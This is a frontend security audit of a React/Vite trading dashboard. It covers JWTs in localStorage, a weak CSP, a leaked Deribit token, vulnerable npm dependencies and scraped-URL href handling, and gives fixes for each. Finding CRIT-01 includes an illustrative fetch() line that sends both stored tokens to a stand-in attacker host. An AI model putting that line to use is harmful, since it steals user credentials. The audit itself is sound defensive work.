# Frontend Security Audit — TSE Dashboard

**Scope:** React 18 + Vite 5 SPA, Mantine v7, react-markdown chat pipeline, served via Nginx behind FastAPI. Reviewed XSS surface, CSP, auth-token storage, secrets in bundle, third-party scripts, postMessage/iframe boundaries, and npm dependency posture.

**Bottom line:** No raw `dangerouslySetInnerHTML` or `innerHTML` writes were found anywhere in `src/` — the chat / news / Codal / Telegram pipelines all render user/scraped content through React text props or `react-markdown` *without* `rehype-raw`, which is the right default. The big remaining issues are (1) JWT access + refresh tokens in `localStorage`, (2) a CSP that allows `'unsafe-inline'` for both `script-src` and `style-src`, (3) a third-party Telegram WebApp script loaded with no Subresource Integrity, (4) a "private" Deribit token shipped in the static bundle via `VITE_DERIBIT_ACCESS_TOKEN`, and (5) eight known npm vulnerabilities (5 high, 3 moderate) — most fixable by bumping `axios` and `vite`, but `xlsx@0.18.5` has no fixed release on npm.

---

## Critical

### CRIT-01 — JWT access + refresh tokens stored in `localStorage`
- **Severity:** Critical
- **Location:** `frontend/src/context/AuthContext.jsx:13-14, 30-31, 40-41, 79, 83-84, 103, 123, 134-135, 164-165, 178-179`; also `frontend/src/services/loans/api.ts:55`
- **Description:** Both the access token (`auth_token`) and refresh token (`auth_refresh_token`) are written to and read from `window.localStorage`. Any successful XSS — even in a third-party dependency loaded into the SPA — gives the attacker durable, exfiltratable credentials. The refresh token is especially valuable because it survives logout-on-other-tab and rotates the access token. The codebase already acknowledges this (`// TODO: [CRIT-01] SECURITY` comment on line 6) but has not migrated.
- **Exploit:**  Any reflected/stored XSS, prototype-pollution gadget in axios (see HIGH-04), or compromised npm package can run `fetch('https://attacker.tld/x?t=' + localStorage.getItem('auth_token') + ':' + localStorage.getItem('auth_refresh_token'))`. The refresh token in particular lets the attacker mint new access tokens long after the user has closed the tab.
- **Fix:** Move both tokens to `HttpOnly; Secure; SameSite=Strict` cookies set by the backend on `/auth/login`, `/auth/register`, `/auth/refresh`, and `/auth/telegram`. Drop the client-side `Authorization: Bearer …` interceptor in favor of cookie auth, and add a CSRF mitigation (double-submit token or `SameSite=Strict` + custom request header check). Until then, at minimum: shorten the refresh-token TTL and bind it to a fingerprint server-side.

---

## High

### HIGH-01 — CSP allows `'unsafe-inline'` for both scripts and styles
- **Severity:** High
- **Location:** `infra/nginx/nginx.conf:78`
- **Description:** The CSP header is:
  ```
  default-src 'self'; script-src 'self' 'unsafe-inline' https://telegram.org;
  style-src 'self' 'unsafe-inline'; font-src 'self' data:;
  img-src 'self' data: blob: https:; connect-src 'self' ws: wss: https:;
  frame-ancestors 'none'; base-uri 'self'; form-action 'self';
  ```
  `'unsafe-inline'` in `script-src` defeats the primary value of CSP — it allows inline `<script>` and `on*=` handlers, which is exactly what a stored-XSS payload would produce. The repo already flags this (`# TODO: [HIGH-01]`). `connect-src 'self' ws: wss: https:` is also wide open — any HTTPS host can be reached, which makes data exfiltration trivial after any XSS.
- **Exploit:** If any sink renders attacker-controlled HTML in the future (e.g. a feed switch to `rehype-raw`, a Mantine vulnerability), the CSP would not block payload execution. Combined with `connect-src https:`, exfil to attacker-controlled HTTPS hosts is unimpeded.
- **Fix:** Remove `'unsafe-inline'` from `script-src`. The only inline script in `index.html` is the 1-liner setting `data-mantine-color-scheme` — move that to `main.jsx` (or use a strict-dynamic + nonce pattern injected by nginx). Tighten `style-src` similarly via a nonce, or accept `'unsafe-inline'` for styles only (Mantine emits inline styles). Restrict `connect-src` to `'self' wss://${host} https://www.deribit.com https://telegram.org` (plus whatever the backend explicitly proxies). Add `object-src 'none'` and `Trusted Types: require-trusted-types-for 'script'` for defense-in-depth.

### HIGH-02 — Third-party Telegram script loaded without Subresource Integrity
- **Severity:** High
- **Location:** `frontend/index.html:30`
- **Description:** `<script src="https://telegram.org/js/telegram-web-app.js" defer></script>` has no `integrity=` and no `crossorigin=` attribute. The script runs in the SPA's origin and has access to `window.Telegram.WebApp.initData`, which is the seed for the `/api/auth/telegram` auto-login flow (`AuthContext.jsx:127-145`). Telegram serves this asset from a versionless URL, so its content can change at any time and the SPA will execute whatever it returns.
- **Exploit:** Any compromise of `telegram.org` (CDN, BGP hijack, MITM on a non-HSTS-preloaded path the user visits first, or a malicious Telegram update) executes attacker JS in your origin — full XSS, including stealing the localStorage tokens from CRIT-01.
- **Fix:** Pin the asset by hash and add `integrity` + `crossorigin="anonymous"`, e.g. download the file once, host it locally under `/vendor/telegram-web-app.js`, and serve with the `immutable` cache header. If you must load it cross-origin, generate an SRI hash at build time and fail loudly if it changes.

### HIGH-03 — "Private" Deribit access token shipped in the static bundle
- **Severity:** High
- **Location:** `frontend/src/services/deribit.js:3-5`
- **Description:** `export const DERIBIT_ACCESS_TOKEN = import.meta.env.VITE_DERIBIT_ACCESS_TOKEN ?? ''` is read at build time and embedded into the JS bundle. Anything prefixed `VITE_` is *public* by definition — Vite inlines it into the chunk. The accompanying comment ("Private channel access token … Never hardcode credentials in source") demonstrates that someone believed this was a safe place for a credential; it is not.
- **Exploit:** Anyone who downloads the production JS bundle can `grep` for the token (or just look at `vendor-axios`/`services` chunks) and authenticate to Deribit private channels as your account.
- **Fix:** Do not put any Deribit credential in the frontend. If private channels are needed, proxy them through the FastAPI backend, which holds the secret in `.env` (server-side). Rotate the current Deribit token immediately, since any past production deploy has leaked it to anyone who pulled the bundle. Remove `VITE_DERIBIT_ACCESS_TOKEN` from any deploy `.env.production`.

### HIGH-04 — Vulnerable `axios` (and several other deps) in production tree
- **Severity:** High
- **Location:** `frontend/package.json:23` (`axios ^1.6.7` → resolves to a pre-1.15.x version); `/tmp/npm_audit.json`
- **Description:** `npm audit` reports 8 advisories (5 high, 3 moderate, 0 critical):
  | Package | Severity | Range affected | Fix available |
  |---|---|---|---|
  | `axios` | high | `<1.15.2` | yes (bump to `^1.15.2`) |
  | `xlsx` | high | `<0.20.2` | **no fix on npm** — the maintainer publishes only at cdn.sheetjs.com |
  | `vite` | high | `<=7.3.1` | yes (`vite@8.x`, semver-major) |
  | `rollup` | high | `<4.59.0` | yes (transitive via vite) |
  | `picomatch` | high | `>=4.0.0 <4.0.4` | yes |
  | `esbuild` | moderate | `<=0.24.2` | yes (transitive via vite) |
  | `postcss` | moderate | `<8.5.10` | yes |
  | `follow-redirects` | moderate | `<=1.15.11` | yes |

  The `axios` chain is especially relevant to the frontend: the prototype-pollution gadgets (GHSA-w9j2-pvgh-6h63, GHSA-3w6x-2g7m-8v23, GHSA-q8qp-cvcw-x6jj) compose with the JWT-in-localStorage finding (CRIT-01) to make a credential-theft chain straightforward whenever a user-controlled string reaches a `JSON.parse` reviver on the same page.
- **Exploit:** GHSA-q8qp-cvcw-x6jj — prototype-pollution read-side gadget in axios HTTP adapter — allows credential injection / request hijacking under the conditions described in the advisory (any code path where attacker-controlled JSON ends up parsed and merged with axios config). `xlsx@0.18.5` is affected by both CVE-2023-30533 (prototype pollution) and CVE-2024-22363 (regex DoS).
- **Fix:**
  - `npm i axios@^1.15.2 follow-redirects@^1.15.11 postcss@^8.5.10`
  - Bump `vite` to v8 (semver-major, validate the build).
  - Replace `xlsx@0.18.5` with the maintainer's CDN release (`https://cdn.sheetjs.com/xlsx-0.20.x/xlsx-0.20.x.tgz`) or migrate to `exceljs`/`@e965/xlsx`.
  - Add `npm audit --omit=dev --audit-level=high` to the CI pipeline as a build gate.

### HIGH-05 — JWT sent in WebSocket URL query string
- **Severity:** High
- **Location:** `frontend/src/hooks/useVoiceCall.js:66-73`
- **Description:** `new WebSocket(\`${protocol}//${host}/ws/voice?${params}\`)` puts the access token (`token: accessToken`) in the request URL. The full URL is recorded in nginx `access.log` (see `nginx.conf:15-19` — the log format includes `"$request"`), in any reverse-proxy access logs, and potentially in browser history / referer-equivalents. Anyone with access to log shipping (Sentry, log-aggregator, sysadmin) can replay valid JWTs.
- **Exploit:** Operator with read access to nginx logs reads recent JWTs and impersonates users until token expiry.
- **Fix:** Send the token as a `Sec-WebSocket-Protocol` subprotocol value (server reads it from the upgrade handshake), or as a short-lived one-time WebSocket ticket fetched from a non-logged endpoint (POST `/api/auth/ws-ticket` returning a 30-second token). Also: scrub `?token=` from the nginx log format.

---

## Medium

### MED-01 — Scraped URLs rendered into `href={r.link}` without scheme allow-listing
- **Severity:** Medium
- **Location:** `frontend/src/pages/Codal.jsx:99-133`, `frontend/src/components/cards/CodalAnnouncementsCard.jsx:35-58`, `frontend/src/components/news/NewsArticleCard.jsx:131`, `frontend/src/components/chat/SourceCard.jsx:25,96`, `frontend/src/features/landing/components/LandingFooter.jsx:48`
- **Description:** These `<a href={r.link}>` (and equivalent Mantine `<Anchor>`) bindings put scraped, attacker-influenceable URLs directly into the `href`. React 16.9+ blocks `javascript:` URLs in `href` with a one-time runtime warning, but it does **not** throw, and Mantine's `Anchor`/`Badge component="a"` is just a thin wrapper. Modern React does block this in current versions, so the practical risk today is low — but the same untrusted strings are also passed to `target="_blank"` flows where any non-`http(s)` scheme (e.g. `tg://`, `intent://`, `chrome://`) is unexpected behaviour. The chat MarkdownRenderer already does this validation correctly (`MarkdownRenderer.jsx:74-82`); the scraped-feed renderers do not.
- **Exploit:** Compromise of a scraper data source (Codal field, RSS title, Telegram channel under your scraper's control) → links that escape the intended `http(s)` set, e.g. `intent://…` to phish via deeplink, or `data:text/html,…` if a future React or Mantine bug regresses scheme blocking.
- **Fix:** Apply the `isSafeUrl` helper from `MarkdownRenderer.jsx` to every `href={someExternal}` callsite — e.g. wrap in a `<SafeAnchor>` that returns `'#'` when the scheme is not `http://`, `https://`, or `mailto:`. Alternatively, validate URLs once at the API layer when persisting scraped rows.

### MED-02 — `printWindow.document.write` builds HTML by string concatenation from data
- **Severity:** Medium
- **Location:** `frontend/src/features/loans/reminders/PaymentScheduleTable.tsx:117-153`
- **Description:** The print routine builds an HTML string by concatenating `p.installmentNumber`, `p.dueDateJalali`, `p.principalPayment`, etc. — straight into a `document.write` call. Today these fields come from your own backend and are formatted via `formatNumber()` (which produces only digits + commas). However, `dueDateJalali` is passed through unescaped, and any future field added to `PaymentScheduleItem` would silently inherit the same lack of escaping.
- **Exploit:** If a backend-side bug or shared schema lets HTML reach `dueDateJalali` (or a column added later), the print window executes it. Same-origin context, so it has access to localStorage tokens (CRIT-01) before the user clicks Print's actual print button.
- **Fix:** Build the print document by creating DOM nodes (`printWindow.document.createElement` + `.textContent = …`) instead of string concatenation. Or, use a templating helper that HTML-escapes by default. As a quick fix, wrap each interpolated value in a small `escapeHtml()` helper.

### MED-03 — Sentry session-replay enabled on errors with no input scrubbing config
- **Severity:** Medium (privacy + secret-leak risk)
- **Location:** `frontend/src/main.jsx:21-30`
- **Description:** `Sentry.replayIntegration()` is added with `replaysOnErrorSampleRate: 1.0`, meaning every error session is recorded and uploaded. Defaults mask text input but **not** all sensitive content; the dashboard contains forms (`/auth/login`, OCR upload, document upload), and the localStorage tokens (CRIT-01) can be observed indirectly via XHR replay if `networkDetailAllowUrls` is set. No explicit `maskAllText`, `blockAllMedia`, or `maskAllInputs: true` is configured.
- **Exploit:** Any error during login captures the username field's keystrokes (text inputs are masked by default; password inputs are masked) — but custom Mantine `<TextInput type="text">` for username is still visible. Any error in axios captures request URLs (HIGH-05's `?token=` lands here).
- **Fix:** Configure `replayIntegration({ maskAllText: true, maskAllInputs: true, blockAllMedia: true, networkDetailAllowUrls: [] })`. Scrub `?token=` and `Authorization` in `beforeSend`/`beforeBreadcrumb`. Verify the Sentry DSN is environment-restricted (only `prod` org).

### MED-04 — Inactivity logout clears localStorage but axios in-flight requests keep the token
- **Severity:** Medium
- **Location:** `frontend/src/context/AuthContext.jsx:37-44, 47-54`
- **Description:** `doLogout` removes the token from localStorage but does not invalidate it server-side. The 5-minute inactivity timer (line 15) only protects against **local** session reuse; the JWT remains valid until its issued `exp`. Combined with HIGH-05 (token in WS URL), a stolen token from logs has the full original lifetime.
- **Exploit:** Token captured at login is still valid after inactivity-logout because no `/api/auth/logout` is called.
- **Fix:** Add an `await axios.post('/api/auth/logout')` (server invalidates the refresh token, optionally adds JWT to a short-lived denylist in Redis) before clearing localStorage. Same for the explicit `logout` action.

---

## Low

### LOW-01 — `X-XSS-Protection: 1; mode=block` is deprecated and can introduce XS-Leaks
- **Severity:** Low
- **Location:** `infra/nginx/nginx.conf:73`
- **Description:** Modern browsers (Chrome ≥ 78, Edge ≥ 79, Firefox always) ignore or have removed the legacy XSS auditor. Setting `1; mode=block` was historically known to *create* XS-Leak primitives in older Chrome.
- **Fix:** Replace with `X-XSS-Protection: 0` (per OWASP secure-headers guidance), and rely on the CSP from HIGH-01 instead.

### LOW-02 — `Permissions-Policy` allows `microphone=(self)` even on routes that don't need it
- **Severity:** Low
- **Location:** `infra/nginx/nginx.conf:79`
- **Description:** `microphone=(self)` is required by `useVoiceCall.js`, but it is granted to the entire origin. If a future XSS slips through, the attacker has mic access without prompting.
- **Fix:** Either accept this risk (voice features need it), or move the voice page to a subdomain so `microphone=()` can be set on the main origin.

### LOW-03 — `<meta name="referrer">` not set; relies on header `Referrer-Policy`
- **Severity:** Low / Info
- **Location:** `frontend/index.html`
- **Description:** Header `Referrer-Policy: strict-origin-when-cross-origin` is set in nginx — fine. But there's no `<meta name="referrer">` fallback for cached HTML served from a CDN that strips response headers. Minor.
- **Fix:** Add `<meta name="referrer" content="strict-origin-when-cross-origin">` for belt-and-suspenders.

### LOW-04 — `connect-src` allows `ws:` (plaintext WebSockets)
- **Severity:** Low
- **Location:** `infra/nginx/nginx.conf:78`
- **Description:** `connect-src 'self' ws: wss: https:` whitelists *plaintext* `ws:` to any host. In production over HTTPS, the browser will already block mixed-content `ws:` connections, but the CSP shouldn't be the one allowing it.
- **Fix:** Drop `ws:`, keep only `wss:`. The dev server runs over HTTP locally and is unaffected (CSP is only on the prod nginx).

### LOW-05 — `xlsx` lazy-loaded across multiple export paths but bundled despite known DoS/PP CVEs
- **Severity:** Low (chain to HIGH-04)
- **Location:** `frontend/package.json:42`, `frontend/src/utils/exportData.js`, `frontend/src/utils/csv.ts`
- **Fix:** Tracked under HIGH-04. If migration is delayed, ensure `xlsx` is only imported by user-initiated export actions (it is) and never receives untrusted server input.

---

## Info

### INFO-01 — No `dangerouslySetInnerHTML`, no `innerHTML =`, no `eval`/`new Function` in `src/`
A repo-wide grep for `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `eval(`, `new Function`, and `document.write` returned only **one** hit: the `printWindow.document.write` in `PaymentScheduleTable.tsx` (covered as MED-02). All chat / Codal / News / Telegram pipelines render content via React text nodes or `react-markdown` without `rehype-raw`, which is the safe default. `react-markdown@10` does not render embedded HTML unless explicitly opted in. Good baseline.

### INFO-02 — `react-markdown` pipeline is conservatively configured
`MarkdownRenderer.jsx` uses only `remarkGfm` (no `rehype-raw`), and `<a>` rendering goes through an explicit `isSafeUrl` allow-list of `http:`/`https:`/`mailto:` plus relative paths. Code blocks render via `react-syntax-highlighter` with `PrismLight` and a strict allow-list of languages. LLM output is treated as markdown text, never as HTML — appropriate for prompt-injection containment.

### INFO-03 — `postMessage` usage is limited to Web Workers
All `postMessage` callsites point at `Worker` instances created by Vite (`?worker` import suffix); none target `window` or any iframe. There is no `window.addEventListener('message', …)` listener anywhere in `src/`. No iframe `<iframe>` tags exist. No postMessage XSS surface.

### INFO-04 — Source maps are not shipped to production by default
`vite.config.js` does not set `build.sourcemap`; Vite v5 default is `false`. Confirmed no `.map` files would be generated in `dist/`. Sentry will be unable to symbolicate without explicit upload — that's an ops concern, not a leak.

### INFO-05 — `frame-ancestors 'none'` + `X-Frame-Options: DENY` is correctly set
Clickjacking protection is in place at the nginx layer. Good.

### INFO-06 — File upload `accept=` filters present but server must still validate
`Documents.jsx:336` (`accept=".pdf,.txt,.docx"`), `ChatHeader.jsx:293` (`accept=".pdf"`), and `LoanImportOCRSection.tsx:94` (`accept="image/png,image/jpeg,application/pdf"`) all use `accept=`. The frontend filter is purely a UX hint and is bypassable; backend MIME / magic-byte validation is **out of scope here** but should be confirmed by the backend audit.

### INFO-07 — `Strict-Transport-Security` set, but no `preload`
`max-age=31536000; includeSubDomains` is correct, but `preload` is missing. Add it after registering with hstspreload.org.

---

## XSS sink inventory

| Sink | File:Line | Source of input | Trust classification | Notes |
|---|---|---|---|---|
| `printWindow.document.write(…)` | `frontend/src/features/loans/reminders/PaymentScheduleTable.tsx:127` | Mixed: `schedule[].installmentNumber` (numeric, safe), `schedule[].dueDateJalali` (string from backend, unescaped), `formatNumber(...)` (numeric only) | **Backend-trusted, but unescaped** | MED-02. String concatenation; replace with `createElement` + `textContent`. |
| `dangerouslySetInnerHTML={…}` | — | — | — | **Zero occurrences** in `frontend/src/`. |
| `el.innerHTML =` / `el.outerHTML =` | — | — | — | **Zero occurrences** in `frontend/src/`. |
| `eval(…)` / `new Function(…)` | — | — | — | **Zero occurrences**. |
| `document.write(…)` (other than print) | — | — | — | None. |
| `setTimeout(string, …)` | — | — | — | All `setTimeout`/`setInterval` call sites pass functions (verified across 25+ matches). |
| `<a href={value}>` with scraped value | `Codal.jsx:102,119,133`; `CodalAnnouncementsCard.jsx:39,52`; `NewsArticleCard.jsx:131`; `chat/SourceCard.jsx:25,96` | Scraped Codal/RSS/Telegram URLs | **Scraper-trusted** — needs scheme allow-list | MED-01. React's built-in `javascript:` block helps but is not a guarantee. |
| `<a href={value}>` with LLM/markdown value | `features/chat/components/MarkdownRenderer.jsx:109` | LLM output via remark | **Validated** (`isSafeUrl`) | Safe — only `http:`/`https:`/`mailto:`/relative pass. |
| `window.location.href = …` | `KeyboardShortcutsModal.jsx:71`, `RouteErrorBoundary.jsx:43,56`, `loans/ErrorBoundary.tsx:39`, `LandingPage.jsx:111`, `PortfolioDashboard.jsx:271` | Static route literals or `feature.href` from local config | **Static** | No open-redirect risk found. |
| `navigate(value)` | 25+ callsites | All template strings with route-prefix + sanitized id (`encodeURIComponent` used in `PeerComparisonCard.jsx:35`) | **Static / id-only** | No untrusted prefix. |
| `URL.createObjectURL(blob)` | `csv.ts:11`, `exportData.js:22,45`, `ExportButton.tsx:21,36`, `OptimizerCharts.tsx:68,79`, `ChatDrawer.jsx:370`, `useOptionsState.js:126`, `logSaver.ts:185` | User-initiated CSV/JSON/MD export of own data | **Self-generated** | Safe; download-only flow. |
| `Worker.postMessage(…)` | 7 hooks under `frontend/src/hooks/use*Worker.js` | App config objects | **App-internal** | No window/iframe postMessage. |
| `addEventListener('message', …)` | — | — | — | **Zero occurrences**. No cross-frame message handler. |
| `<iframe>` | — | — | — | **Zero occurrences** in `src/`. |

---

## Recommended remediation order

1. **CRIT-01** — Migrate JWT + refresh to `HttpOnly` cookies. Single biggest XSS-blast-radius reduction.
2. **HIGH-04** — `npm i axios@^1.15.2 follow-redirects@^1.15.11 postcss@^8.5.10` and bump vite to v8 in a feature branch.
3. **HIGH-03** — Rotate the Deribit token, remove `VITE_DERIBIT_ACCESS_TOKEN`, proxy private channels through FastAPI.
4. **HIGH-01** — Drop `'unsafe-inline'` from `script-src`; move the inline `data-mantine-color-scheme` script into `main.jsx`.
5. **HIGH-02** — Self-host `telegram-web-app.js` with SRI, or pin its hash.
6. **HIGH-05** — Move WS auth out of the URL query string; scrub nginx logs.
7. **MED-01..04, LOW-01..05** — Tighten in a follow-up PR.
